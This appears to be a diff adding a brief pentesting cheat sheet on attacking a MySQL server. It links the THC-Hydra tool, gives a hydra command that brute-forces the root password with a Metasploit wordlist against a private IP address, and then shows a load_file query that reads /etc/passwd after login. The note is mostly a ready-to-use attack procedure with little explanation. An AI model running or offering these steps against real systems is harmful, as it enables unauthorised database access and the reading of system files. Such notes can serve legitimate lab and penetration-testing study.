@@ -1,0 +1,13 @@
+MySQL
+
+https://github.com/vanhauser-thc/thc-hydra
+1. Identify the server run MySQL
+2. Try to find weak password for mysql database :
+   
+    2.1 hydra -l root -P /usr/share/metasploit-framework/data/wordlists/password.lst mysql://192.168.3.100
+
+3. login to the MYSQL if a waek password was found
+4. list all password using 
+    
+    4.1 select load_file('/etc/passwd');
+    
